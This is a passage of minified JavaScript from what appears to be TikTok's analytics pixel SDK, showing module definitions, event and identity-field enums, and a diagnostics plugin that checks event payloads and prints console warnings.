    if (r[t]) return r[t].exports;
    var e = r[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return n[t].call(e.exports, e, e.exports, o), e.l = !0, e.exports;
  }
  o.m = n, o.c = r, o.d = function (t, e, n) {
    o.o(t, e) || Object.defineProperty(t, e, {
      enumerable: !0,
      get: n
    });
  }, o.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, o.t = function (e, t) {
    if (1 & t && (e = o(e)), 8 & t) return e;
    if (4 & t && "object" == typeof e && e && e.__esModule) return e;
    var n = Object.create(null);
    if (o.r(n), Object.defineProperty(n, "default", {
      enumerable: !0,
      value: e
    }), 2 & t && "string" != typeof e) for (var r in e) o.d(n, r, function (t) {
      return e[t];
    }.bind(null, r));
    return n;
  }, o.n = function (t) {
    var e = t && t.__esModule ? function () {
      return t["default"];
    } : function () {
      return t;
    };
    return o.d(e, "a", e), e;
  }, o.o = function (t, e) {
    return Object.prototype.hasOwnProperty.call(t, e);
  }, o.p = "https://analytics.tiktok.com/i18n/pixel/", o(o.s = "dbMG");
}({
  "/6w+": function (t, e, n) {
    "use strict";

    var r, o, i;
    n.d(e, "b", function () {
      return r;
    }), n.d(e, "a", function () {
      return o;
    }), n.d(e, "c", function () {
      return i;
    }), (e = r = r || {})[e.OTHER = 0] = "OTHER", e[e.ANDROID = 1] = "ANDROID", e[e.IOS = 2] = "IOS", (e = o = o || {}).LOAD_START = "load_start", e.LOAD_END = "load_end", e.BEFORE_INIT = "before_init", e.INIT_START = "init_start", e.INIT_END = "init_end", e.JSB_INIT_START = "jsb_init_start", e.JSB_INIT_END = "jsb_init_end", e.BEFORE_AD_INFO_INIT_START = "before_ad_info_init_start", e.AD_INFO_INIT_START = "ad_info_init_start", e.AD_INFO_INIT_END = "ad_info_init_end", e.IDENTIFY_INIT_START = "identify_init_start", e.IDENTIFY_INIT_END = "identify_init_end", e.PLUGIN_INIT_START = "_init_start", e.PLUGIN_INIT_END = "_init_end", e.PIXEL_SEND = "pixel_send", e.PIXEL_SEND_PCM = "pixel_send_PCM", e.JSB_SEND = "jsb_send", e.HTTP_SEND = "http_send", e.HANDLE_CACHE = "handle_cache", e.INIT_ERROR = "init_error", e.PIXEL_EMPTY = "pixel_empty", e.JSB_ERROR = "jsb_error", e.API_ERROR = "api_error", e.PLUGIN_ERROR = "plugin_error", e.CUSTOM_INFO = "custom_info", e.CUSTOM_ERROR = "custom_error", (e = i = i || {})[e.IFRAME = 1] = "IFRAME", e[e.NORMAL = 2] = "NORMAL", e[e.WEBWORKER = 3] = "WEBWORKER";
  },
  "2HLQ": function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {})[e.NOT_SURE = 0] = "NOT_SURE", e[e.INVOKE_METHOD_ENABLED = 1] = "INVOKE_METHOD_ENABLED", e[e.INVOKE_METHOD_NOT_ENABLED = 2] = "INVOKE_METHOD_NOT_ENABLED", e[e.TOUTIAO_BRIDGE_NOT_ENABLED = 3] = "TOUTIAO_BRIDGE_NOT_ENABLED";
  },
  GJ6r: function (t, f, p) {
    "use strict";

    !function (t) {
      p.d(f, "a", function () {
        return r;
      }), p.d(f, "g", function () {
        return o;
      }), p.d(f, "e", function () {
        return c;
      }), p.d(f, "f", function () {
        return u;
      }), p.d(f, "b", function () {
        return d;
      }), p.d(f, "d", function () {
        return l;
      }), p.d(f, "c", function () {
        return _;
      });
      var e = p("SbFU"),
        n = (p("2HLQ"), p("IOsT"), p("w0s3")),
        r = function () {
          return "undefined" != typeof globalThis ? globalThis : "undefined" != typeof self ? self : "undefined" != typeof window ? window : void 0 !== t ? t : new Function("return this")();
        },
        o = function () {
          var t = r();
          return "undefined" != typeof t.DedicatedWorkerGlobalScope ? t instanceof t.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === t.constructor.name;
        },
        i = function () {
          var t = r();
          return "object" == typeof navigator ? navigator.userAgent : t._userAgent || "";
        },
        a = function () {
          var t;
          return (null === (t = null === (t = Object(e.e)()) || void 0 === t ? void 0 : t._env) || void 0 === t ? void 0 : t.env) || n.b;
        },
        c = function () {
          return a() !== n.b;
        },
        u = function () {
          return a() === n.i;
        },
        s = (Object(e.n)(function () {
          return /open_news/i.test(i());
        }), Object(e.n)(function () {
          return /ultralite/i.test(i());
        }), function () {
          return /windows phone/i.test(i()) ? "Windows Phone" : /android/i.test(i()) ? "android" : /iPad|iPhone|iPod/.test(i()) ? "ios" : "pc";
        }),
        d = function () {
          return "android" === s();
        },
        l = function () {
          return "ios" === s();
        },
        _ = function () {
          return "development" === "production".trim();
        };
    }.call(this, p("yLpj"));
  },
  HyyX: function (t, e, n) {
    "use strict";

    n.d(e, "c", function () {
      return r;
    }), n.d(e, "a", function () {
      return o;
    }), n.d(e, "b", function () {
      return i;
    });
    var r = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
    (e = a = a || {}).missing = "missing", e.valid = "valid", e.invalid = "invalid", (e = {}).empty = "empty", e.whitespace = "whitespace", e.hardcode = "hardcode", e.encode = "encode", (e = {}).invalidCountry = "invalid_country", e.notANumber = "not_a_number", e.tooShort = "too_short", e.tooLong = "too_long", e.invalidLength = "invalid_length", e.emptyCountryCodeThroughIP = "empty_country_code_through_ip", e.invalidCountryAfterInjectPlus = "invalid_country_after_inject_plus", e.notANumberAfterInjectPlus = "not_a_number_after_inject_plus", e.tooShortAfterInjectPlus = "too_short_after_inject_plus", e.tooLongAfterInjectPlus = "too_long_after_inject_plus", e.invalidLengthAfterInjectPlus = "invalid_length_after_inject_plus", e.invalidCountryAfterInjectCountry = "invalid_country_after_inject_country", e.notANumberAfterInjectCountry = "not_a_number_after_inject_country", e.tooShortAfterInjectCountry = "too_short_after_inject_country", e.tooLongAfterInjectCountry = "too_long_after_inject_country", e.invalidLengthAfterInjectCountry = "invalid_length_after_inject_country", (e = {}).letterCase = "letter_case", e.isNotValidEmail = "is_not_valid_email", e.isNotPossibleEmail = "is_not_possible_email", e.domainTypo = "domain_typo", e.addressFormat = "address_format";
    var o, i, a;
    a.missing, a.missing, a.missing, a.missing, a.missing, a.missing;
    (a = o = o || {}).EMPTY_VALUE = "empty_value", a.WRONG_FORMAT = "wrong_format", a.CORRECT_FORMAT = "correct_format", a.HASHED = "hashed", a.HASHED_ERR = "hashed_err", a.HASHED_CORRECT = "hashed_correct", a.PLAINTEXT_EMAIL = "plaintext_email", a.PLAINTEXT_PHONE = "plaintext_phone", (a = i = i || {}).EMPTY_VALUE = "empty_value", a.PLAIN_EMAIL = "plain_email", a.PLAIN_PHONE = "plain_phone", a.HASHED = "hashed", a.FILTER_EVENTS = "filter_events", a.UNKNOWN_INVALID = "unknown_invalid", a.BASE64_STRING_HASHED = "base64_string_hashed", a.BASE64_HEX_HASHED = "base64_hex_hashed", a.PLAIN_MDN_EMAIL = "plain_mdn_email", (a = {}).Manual = "manual", a.Auto = "auto";
  },
  IOsT: function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {}).Normal = "1", e.Iframe = "2", e.WebWorker = "3", e.SandboxIframe = "4";
  },
  Mo1V: function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = r = r || {}).TRACK = "track", e.PERFORMANCE = "performance", e.PERFORMANCE_INTERACTION = "performance_interaction", e.INTERACTION = "interaction", e.PCM = "PCM", e.SELFHOST = "selfhost", e.AUTO_CONFIG = "auto_config", (e = {}).LDU = "limited_data_use", e.EVENTID = "eventID", e.EVENT_ID = "event_id";
  },
  Pd38: function (t, e, n) {
    "use strict";

    n.d(e, "a", function () {
      return r;
    });
    var o = n("SbFU"),
      r = function (e, t, n) {
        void 0 === n && (n = !1);
        var r = Object(o.e)() || [];
        if (r.dynamicPlugins || (r.dynamicPlugins = []), !r.dynamicPlugins.find(function (t) {
          return t.name === e;
        })) {
          if (!n) if (!Object(o.m)(e)) return;
          r.dynamicPlugins.push({
            name: e,
            handler: t
          });
        }
      };
  },
  SbFU: function (t, e, n) {
    "use strict";

    n.d(e, "f", function () {
      return c;
    }), n.d(e, "j", function () {
      return u;
    }), n.d(e, "e", function () {
      return s;
    }), n.d(e, "m", function () {
      return d;
    }), n.d(e, "l", function () {
      return l;
    }), n.d(e, "g", function () {
      return _;
    }), n.d(e, "h", function () {
      return f;
    }), n.d(e, "d", function () {
      return p;
    }), n.d(e, "p", function () {
      return h;
    }), n.d(e, "c", function () {
      return y;
    }), n.d(e, "o", function () {
      return E;
    }), n.d(e, "n", function () {
      return I;
    }), n.d(e, "k", function () {
      return m;
    }), n.d(e, "b", function () {
      return v;
    }), n.d(e, "a", function () {
      return N;
    }), n.d(e, "i", function () {
      return A;
    });
    n("GJ6r");
    var r = n("w0s3"),
      o = (n("HyyX"), undefined && undefined.__awaiter || function (t, e, c, u) {
        return new (c = c || Promise)(function (n, r) {
          function o(t) {
            try {
              a(u.next(t));
            } catch (e) {
              r(e);
            }
          }
          function i(t) {
            try {
              a(u["throw"](t));
            } catch (e) {
              r(e);
            }
          }
          function a(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(o, i);
          }
          a((u = u.apply(t, e || [])).next());
        });
      }),
      i = undefined && undefined.__generator || function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            "throw": e(1),
            "return": e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return u([e, t]);
          };
        }
        function u(t) {
          if (o) throw new TypeError("Generator is already executing.");
          for (; c;) try {
            if (o = 1, i && (a = 2 & t[0] ? i["return"] : t[0] ? i["throw"] || ((a = i["return"]) && a.call(i), 0) : i.next) && !(a = a.call(i, t[1])).done) return a;
            switch (i = 0, (t = a ? [2 & t[0], a.value] : t)[0]) {
              case 0:
              case 1:
                a = t;
                break;
              case 4:
                return c.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                c.label++, i = t[1], t = [0];
                continue;
              case 7:
                t = c.ops.pop(), c.trys.pop();
                continue;
              default:
                if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  c = 0;
                  continue;
                }
                if (3 === t[0] && (!a || t[1] > a[0] && t[1] < a[3])) {
                  c.label = t[1];
                  break;
                }
                if (6 === t[0] && c.label < a[1]) {
                  c.label = a[1], a = t;
                  break;
                }
                if (a && c.label < a[2]) {
                  c.label = a[2], c.ops.push(t);
                  break;
                }
                a[2] && c.ops.pop(), c.trys.pop();
                continue;
            }
            t = r.call(n, c);
          } catch (e) {
            t = [6, e], i = 0;
          } finally {
            o = a = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      a = undefined && undefined.__read || function (t, e) {
        var n = "function" == typeof Symbol && t[Symbol.iterator];
        if (!n) return t;
        var r,
          o,
          i = n.call(t),
          a = [];
        try {
          for (; (void 0 === e || 0 < e--) && !(r = i.next()).done;) a.push(r.value);
        } catch (c) {
          o = {
            error: c
          };
        } finally {
          try {
            r && !r.done && (n = i["return"]) && n.call(i);
          } finally {
            if (o) throw o.error;
          }
        }
        return a;
      },
      c = (undefined && undefined.__spread, function () {
        var t = s();
        return t._partner || "";
      }),
      u = function () {
        var t = s();
        return t && t.initialize;
      },
      s = function () {
        return "object" == typeof window && window["object" == typeof window && window[r.f] || r.c];
      },
      d = function (t) {
        try {
          var e = s()._plugins || {};
          return null == e[t] || !!e[t];
        } catch (n) {
          return !0;
        }
      },
      l = function () {
        try {
          var t = s();
          return t && t._legacy && 0 !== t._legacy.length ? Object.keys(t._t).length > Object.keys(t._legacy).length || Object.keys(t.context.data.pixelMap).length > Object.keys(t._legacy).length : !1;
        } catch (e) {
          return !1;
        }
      },
      _ = function (t) {
        try {
          var e = s();
          if (e && e._self_host_config && e._self_host_config[t]) return e._self_host_config[t] || "";
        } catch (n) {
          return "";
        }
        return "";
      },
      f = function () {
        var t;
        try {
          return (null === (t = s()) || void 0 === t ? void 0 : t._usd_exchange_rate) || null;
        } catch (e) {
          return null;
        }
      },
      p = function () {
        return new Date(Date.now() + 864e5).toUTCString();
      };
    function h(n, r) {
      void 0 === r && (r = 500);
      var o = Date.now();
      return function () {
        var t = arguments,
          e = Date.now();
        r <= e - o && (n.apply(null, t), o = Date.now());
      };
    }
    function y(n, r, o) {
      var i;
      return function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        clearTimeout(i), i = setTimeout(function () {
          n.apply(o, t);
        }, r);
      };
    }
    function E(e) {
      return void 0 === e && (e = 500), o(this, void 0, void 0, function () {
        return i(this, function (t) {
          return [2, new Promise(function (t) {
            setTimeout(function () {
              t(!0);
            }, e);
          })];
        });
      });
    }
    function I(n, r) {
      var o,
        i = n;
      return function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        return i && (o = n.apply(r, t), i = null), o;
      };
    }
    function m(t, e) {
      return 0 < Object.keys(function i(t, e) {
        var n = {};
        for (var r in t) {
          var o;
          t.hasOwnProperty(r) && !e.hasOwnProperty(r) ? n[r] = t[r] : t.hasOwnProperty(r) && e.hasOwnProperty(r) && t[r] !== e[r] && ("object" == typeof t[r] && "object" == typeof e[r] ? (o = i(t[r], e[r]), 0 < Object.keys(o).length && (n[r] = o)) : n[r] = t[r]);
        }
        for (var r in e) e.hasOwnProperty(r) && !t.hasOwnProperty(r) && (n[r] = e[r]);
        return n;
      }(t, e)).length;
    }
    var v = ["input[type='button']", "input[type='image']", "input[type='submit']", "button", "[class*=btn]", "[class*=Btn]", "[class*=button]", "[class*=Button]", "[role*=button]", "[id*=btn]", "[id*=Btn]", "[id*=button]", "[id*=Button]", "a"],
      N = ["[href^='tel:']", "[href^='callto:']", "[href^='sms:']", "[href^='skype:']", "[href^='whatsapp:']", "[href^='mailto:']"],
      A = function (e) {
        var t = v.some(function (t) {
            return e.matches(t);
          }),
          n = N.some(function (t) {
            return e.matches(t);
          });
        return t && !n;
      };
  },
  SnBs: function (t, e, n) {
    "use strict";

    n.d(e, "a", function () {
      return o;
    });
    var r,
      e = undefined && undefined.__extends || (r = function (t, e) {
        return (r = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        r(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      }),
      o = (i.prototype.pageDidLoad = function () {}, i.prototype.pixelDidMount = function (t) {}, i.prototype.pageUrlWillChange = function (t, e) {}, i.prototype.pageUrlDidChange = function (t, e) {}, i.prototype.initStart = function () {}, i.prototype.initEnd = function () {}, i.prototype.adInfoInitStart = function () {}, i.prototype.adInfoInitEnd = function () {}, i.prototype.contextInitStart = function () {}, i.prototype.contextInitEnd = function () {}, i.prototype.pluginInitStart = function (t) {}, i.prototype.pluginInitEnd = function (t) {}, i.prototype.pixelCreateStart = function (t) {}, i.prototype.pixelCreateEnd = function (t) {}, i.prototype.pixelInitEnd = function (t) {}, i.prototype.pixelSend = function (t, e, n, r, o) {}, i.prototype.pageWillLeave = function (t) {}, i);
    function i(t) {
      t && (this.context = t);
    }
    var a;
    e(c, a = o), c.prototype.pixelDidMount = function (t) {
      var e = t.pixelCode,
        t = this.getTrackType(),
        n = this.context.methods.batchTrack.bind(this.context, {
          pixelCode: e,
          type: t
        });
      this.batchReportFunctions.push(n), this.stash.forEach(function (t) {
        n(t, !1);
      });
    }, c.prototype.pageUrlWillChange = function (t, e) {}, c.prototype.pageUrlDidChange = function (t) {
      t !== this.currentUrl && (this.oldUrl = this.currentUrl, this.currentUrl = t);
    }, c.prototype.handleCacheData = function () {
      var t = this;
      this.stash.forEach(function (e) {
        t.batchReportFunctions.forEach(function (t) {
          t(e, !1);
        });
      });
    }, c.prototype.track = function (e, n) {
      this.stash.push(e), this.batchReportFunctions.forEach(function (t) {
        t(e, n);
      });
    };
    function c(t) {
      var n = a.call(this, t) || this;
      return n.batchReportFunctions = [], n.currentUrl = "", n.oldUrl = "", n.stash = [], n.batchReportFunctions = n.context.methods.getAllPixels().map(function (t) {
        var e = t.pixelCode,
          t = n.getTrackType();
        return n.context.methods.batchTrack.bind(n.context, {
          pixelCode: e,
          type: t
        });
      }), n;
    }
  },
  YuTi: function (t, e) {
    t.exports = function (t) {
      return t.webpackPolyfill || (t.deprecate = function () {}, t.paths = [], t.children || (t.children = []), Object.defineProperty(t, "loaded", {
        enumerable: !0,
        get: function () {
          return t.l;
        }
      }), Object.defineProperty(t, "id", {
        enumerable: !0,
        get: function () {
          return t.i;
        }
      }), t.webpackPolyfill = 1), t;
    };
  },
  dbMG: function (t, e, n) {
    "use strict";

    n.r(e);
    var c,
      r = n("Pd38"),
      o = n("SbFU"),
      i = n("SnBs"),
      u = n("fe1q"),
      s = n("/6w+"),
      a = n("Mo1V"),
      d = n("zT9C"),
      l = n.n(d);
    (d = c = c || {}).EMPTY_EVENT_TYPE_NAME = "EMPTY_EVENT_TYPE_NAME", d.MISMATCHED_EVENT_TYPE_NAME_FOR_CUSTOM_EVENT = "MISMATCHED_EVENT_TYPE_NAME_FOR_CUSTOM_EVENT", d.LONG_EVENT_TYPE_NAME = "LONG_EVENT_TYPE_NAME", d.MISSING_VALUE_PARAMETER = "MISSING_VALUE_PARAMETER", d.MISSING_CURRENCY_PARAMETER = "MISSING_CURRENCY_PARAMETER", d.MISSING_CONTENT_ID = "MISSING_CONTENT_ID", d.MISSING_EMAIL_AND_PHONE = "MISSING_EMAIL_AND_PHONE", d.INVALID_EVENT_PARAMETER_VALUE = "INVALID_EVENT_PARAMETER_VALUE", d.INVALID_CURRENCY_CODE = "INVALID_CURRENCY_CODE", d.INVALID_CONTENT_ID = "INVALID_CONTENT_ID", d.INVALID_CONTENT_TYPE = "INVALID_CONTENT_TYPE", d.INVALID_EMAIL_FORMAT = "INVALID_EMAIL_FORMAT", d.INVALID_PHONE_NUMBER_FORMAT = "INVALID_PHONE_NUMBER_FORMAT", d.INVALID_EMAIL_INFORMATION = "INVALID_EMAIL_INFORMATION", d.INVALID_PHONE_NUMBER_INFORMATION = "INVALID_PHONE_NUMBER_INFORMATION", d.DUPLICATE_PIXEL_CODE = "DUPLICATE_PIXEL_CODE", d.MISSING_PIXEL_CODE = "MISSING_PIXEL_CODE", d.INVALID_PIXEL_CODE = "INVALID_PIXEL_CODE";
    var _,
      f = n("GJ6r"),
      p = /^[a-zA-Z]([a-zA-Z_\-\d]{0,}[a-zA-Z\d])?$/,
      h = ["AED", "ARS", "AUD", "BDT", "BHD", "BIF", "BOB", "BRL", "CAD", "CHF", "CLP", "CNY", "COP", "CRC", "CZK", "DKK", "DZD", "EGP", "EUR", "GBP", "GTQ", "HKD", "HNL", "HUF", "IDR", "ILS", "INR", "ISK", "JPY", "KES", "KHR", "KRW", "KWD", "KZT", "MAD", "MOP", "MXN", "MYR", "NGN", "NIO", "NOK", "NZD", "OMR", "PEN", "PHP", "PKR", "PLN", "PYG", "QAR", "RON", "RUB", "SAR", "SEK", "SGD", "THB", "TRY", "TWD", "UAH", "USD", "VES", "VND", "ZAR"],
      y = ["product", "product_group"],
      E = ["email_is_hashed", "phone_is_hashed", "sha256_email", "sha256_phone"],
      I = {
        EMPTY_EVENT_TYPE_NAME: {
          title: "Missing Event Name",
          desc: "The event name for one or more of your events is empty. This can affect the accuracy of reporting for your conversions.",
          suggestion: "Go to your source code and add a name that follows our format requirements and TikTok policies.",
          link: "https://ads.tiktok.com/marketing_api/docs?rid=5ipocbxyw8v&id=1701890973258754"
        },
        INVALID_CONTENT_ID: {
          title: "Missing value for content ID",
          desc: "Include a value for your 'content_id' parameter. This is required for Video Shopping Ads (VSA).",
          suggestion: "If you are or plan to run Video Shopping Ads (VSA), go to your source code and include a value for the 'content_id' parameter.",
          link: "https://ads.tiktok.com/help/article/standard-events-parameters?redirected=2"
        },
        INVALID_CONTENT_TYPE: {
          title: "Invalid content type",
          desc: 'The content type for one or more of your events is invalid. Content type must be either "product" or "product_group".',
          suggestion: "Go to your source code and update the content type.",
          link: "https://ads.tiktok.com/help/article/standard-events-parameters?redirected=2"
        },
        INVALID_CURRENCY_CODE: {
          title: "Invalid currency code",
          desc: "The currency code for one or more of your events isn't supported. This can affect the accuracy of reporting for your ROAS.",
          suggestion: "Go to your source code and update the 'currency' parameters with a supported currency code.",
          link: "https://ads.tiktok.com/help/article/standard-events-parameters?redirected=2"
        },
        INVALID_EMAIL_FORMAT: {
          title: "Incorrect email format",
          desc: "The email format for your events does not match the format supported. This can impact Advanced Matching and your ad performance.",
          suggestion: "Go to your source code and update the format of your shared emails. It should follow 'xxx@xxx.com' format.",
          link: "https://ads.tiktok.com/marketing_api/docs?id=1739585700402178"
        },
        INVALID_EMAIL_INFORMATION: {
          title: "Invalid email information",
          desc: "The emails shared with your events were invalid.",
          suggestion: 'Go to your source code to double check shared emails. Leave your string empty when customer information isn\'t available. Avoid spaces, "undefined", or other hardcoded values.',
          link: "https://ads.tiktok.com/marketing_api/docs?id=1739585700402178"
        },
        INVALID_EVENT_PARAMETER_VALUE: {
          title: "Invalid value parameter",
          desc: "The 'value' parameter for one or more of your events is invalid. This is used calculate ROAS for people and the bid for your highest value customers. Parameters must be an integer or in the decimal format (e.g. 9.99). Also, they can't contain currency symbols, special characters, letters, or commas.",
          suggestion: "Go to your source code and update the 'value' parameter. It can only include numbers greater than or equal to zero (e.g. 9.99). Do not include currency symbols, special characters, letters, or commas.",
          link: "https://ads.tiktok.com/help/article/standard-events-parameters?redirected=2"
        },
        INVALID_PHONE_NUMBER_FORMAT: {
          title: "Incorrect phone number format",
          desc: "The phone number format for your events doesn't follow the E.164 format. This can affect Advanced Matching and your ad performance.",
          suggestion: "Go to your source code and update your shared phone numbers. It should follow the E.164 format.",
          link: "https://ads.tiktok.com/marketing_api/docs?id=1739585700402178"
        },
        INVALID_PHONE_NUMBER_INFORMATION: {
          title: "Invalid phone number information",
          desc: "The phone numbers shared with your events were invalid.",
          suggestion: 'Go to your source code to double check shared phone numbers. Leave your string empty when customer information isn\'t available. Avoid spaces, "undefined", or other hardcoded values.',
          link: "https://ads.tiktok.com/marketing_api/docs?id=1739585700402178"
        },
        LONG_EVENT_TYPE_NAME: {
          title: "Event Name Too Long",
          desc: "1 event type exceeds the 50 character limit.",
          suggestion: "Go to your source code and make these event names 50 characters or less.",
          link: "https://ads.tiktok.com/help/article/custom-events?lang=en"
        },
        MISMATCHED_EVENT_TYPE_NAME_FOR_CUSTOM_EVENT: {
          title: "Invalid Event Name Format",
          desc: "1 event name was rejected for not following TikTok format requirements.",
          suggestion: "Go to your source code and update these event types according to TikTok format requirements.",
          link: "https://ads.tiktok.com/help/article/custom-events?lang=en"
        },
        MISSING_CONTENT_ID: {
          title: "Missing 'content_id' paramter",
          desc: "The 'content_id' parameter isn't being received. This is required for Video Shopping Ads (VSA).",
          suggestion: "Include the 'content_id' parameter in your source code. This is required for Video Shopping Ads (VSA).",
          link: "https://ads.tiktok.com/help/article/standard-events-parameters?redirected=2"
        },
        MISSING_CURRENCY_PARAMETER: {
          title: 'Missing "currency" parameter',
          desc: "Events shared are missing a 'currency' parameter. This impacts our ability to receive the value amount correctly, which can affect the accuracy of reporting for your return on ad spend.",
          suggestion: 'Go to your source code and include the "currency" parameter. You can check supported currency codes. {{learn_more}}',
          link: "https://ads.tiktok.com/help/article/standard-events-parameters?redirected=2"
        },
        MISSING_EMAIL_AND_PHONE: {
          title: "Missing email and phone number",
          desc: "Email and phone number info isn't being received. This information is required for Complete Payment events.",
          suggestion: "Improve your email and phone coverage. This allows you to attribute more conversions and reach more people with your ads.",
          link: "https://ads.tiktok.com/marketing_api/docs?rid=5ipocbxyw8v&id=1701890972946433"
        },
        MISSING_VALUE_PARAMETER: {
          title: 'Missing "value" parameter',
          desc: "Events shared are missing a 'value' parameter'. This is used calculate ROAS for people and the bid for your highest value customers. ",
          suggestion: 'Go to your source code and include the "value" parameter.',
          link: "https://ads.tiktok.com/help/article/standard-events-parameters?redirected=2"
        },
        DUPLICATE_PIXEL_CODE: {
          title: "Duplicate Pixel ID",
          desc: "The pixel ID is duplicate. This could impact the pixel data accuracy.",
          suggestion: "Please double check and delete any unnecessary pixel code.",
          link: ""
        },
        MISSING_PIXEL_CODE: {
          title: "Missing pixel ID",
          desc: "Some of the events sent to your TikTok account are missing a pixel ID.",
          suggestion: "Go to your source code and double check that the 20-character pixel ID has been added to the ttq.load() function. Don't send null values or spaces. If you edited the base code, ensure the event.js has the 'sdkid' in the Chrome network panel.",
          link: ""
        },
        INVALID_PIXEL_CODE: {
          title: "Invalid pixel ID",
          desc: "The pixel ID is invalid. This could prevent your pixel from receiving data.",
          suggestion: "Please go to Events Manager and find the correct pixel ID.",
          link: ""
        }
      },
      m = function (t) {
        return void 0 === t;
      };
    (d = _ = _ || {})[d.Live = 0] = "Live", d[d.NoRecord = 1] = "NoRecord";
    var v,
      N,
      A = n("HyyX"),
      T = function (t) {
        return !!["null", "undefined"].includes(t.event) || !!/^\s*$/.test(t.event) || !t.event;
      },
      d = undefined && undefined.__extends || (v = function (t, e) {
        return (v = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        v(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      }),
      g = "DiagnosticsConsole",
      n = (N = i.a, d(b, N), b.prototype.isDisableDiagnosticsConsole = function () {
        try {
          var t = (window[Object(u.b)().lib] || Object(o.e)() || {})._o || {};
          return Boolean(Object.values(t).some(function (t) {
            return "undefined" != typeof t.diagnostics && !t.diagnostics;
          }));
        } catch (e) {
          return !1;
        }
      }, b.prototype.warn = function (t, e) {
        try {
          if (this.isDisableDiagnosticsConsole()) return;
          r = e, c[n = t] && (o = Object(f.a)(), i = "[TikTok Pixel] - " + (n = I[n]).title, n.desc && (i += "\nIssue: " + n.desc), n.suggestion && (i += "\nSuggestion: " + n.suggestion), r && Object.keys(r).forEach(function (t) {
            i = i.split("{{" + t + "}}").join(r[t]);
          }), i = i.trim(), n.link && (i += " See " + n.link + " for more information."), o && o.console && o.console.warn && o.console.warn(i));
        } catch (a) {
          Object(u.a)(s.a.CUSTOM_ERROR, a, {
            custom_name: "diagnostics_console",
            custom_enum: t
          });
        }
        var n, r, o, i;
      }, b.prototype.pixelDidMount = function (t) {
        var e = this;
        t.getPixelInfo().then(function (t) {
          e.handlePixelInfoValidate(t);
        })["catch"](function (t) {
          Object(u.a)(s.a.CUSTOM_ERROR, t, {
            custom_name: "diagnostics_console",
            custom_enum: "pixel"
          });
        });
      }, b.prototype.pixelSend = function (t, e, n, r, o) {
        void 0 === r && (r = {});
        try {
          r && r._i || o !== a.a.TRACK || "Pageview" === e || this.handleEventPayloadValidate(l()(n || {}));
        } catch (i) {
          Object(u.a)(s.a.CUSTOM_ERROR, i, {
            custom_name: "diagnostics_console",
            custom_enum: "track"
          });
        }
      }, b.prototype.handlePixelInfoValidate = function (t) {
        t.status !== _.Live && this.warn(c.INVALID_PIXEL_CODE);
      }, b.prototype.handleEventPayloadValidate = function (t) {
        var e, n;
        t.properties || (t.properties = {}), T(t) && this.warn(c.EMPTY_EVENT_TYPE_NAME), e = void 0 === (e = (n = t).event) ? "" : e, T(n) || p.test(e) || this.warn(c.MISMATCHED_EVENT_TYPE_NAME_FOR_CUSTOM_EVENT), function (t) {
          t = t.event;
          return (void 0 === t ? "" : t).length <= 50;
        }(t) || this.warn(c.LONG_EVENT_TYPE_NAME), function (t) {
          var e = t.event,
            t = t._inspection;
          if ("CompletePayment" !== e) return !1;
          var t = (void 0 === t ? {} : t).identity_params,
            n = void 0 === t ? {} : t;
          return 0 === Object.keys(n).length || E.every(function (t) {
            return (n[t] || []).includes(A.b.EMPTY_VALUE);
          });
        }(t) && this.warn(c.MISSING_EMAIL_AND_PHONE), function (t) {
          t = t._inspection, t = void 0 === t ? {} : t;
          return !(!t || !t.identity_params) && ((t.identity_params.email_is_hashed || []).includes(A.b.FILTER_EVENTS) || (t.identity_params.sha256_email || []).includes(A.b.FILTER_EVENTS));
        }(t) && this.warn(c.INVALID_EMAIL_INFORMATION), function (t) {
          t = t._inspection, t = void 0 === t ? {} : t;
          return !(!t || !t.identity_params) && ((t.identity_params.email_is_hashed || []).includes(A.b.UNKNOWN_INVALID) || (t.identity_params.sha256_email || []).includes(A.b.UNKNOWN_INVALID));
        }(t) && this.warn(c.INVALID_EMAIL_FORMAT), function (t) {
          t = t._inspection, t = void 0 === t ? {} : t;
          return !(!t || !t.identity_params) && ((t.identity_params.phone_is_hashed || []).includes(A.b.FILTER_EVENTS) || (t.identity_params.sha256_phone || []).includes(A.b.FILTER_EVENTS));
        }(t) && this.warn(c.INVALID_PHONE_NUMBER_INFORMATION), function (t) {
          t = t._inspection, t = void 0 === t ? {} : t;
          return !(!t || !t.identity_params) && ((t.identity_params.phone_is_hashed || []).includes(A.b.UNKNOWN_INVALID) || (t.identity_params.sha256_phone || []).includes(A.b.UNKNOWN_INVALID));
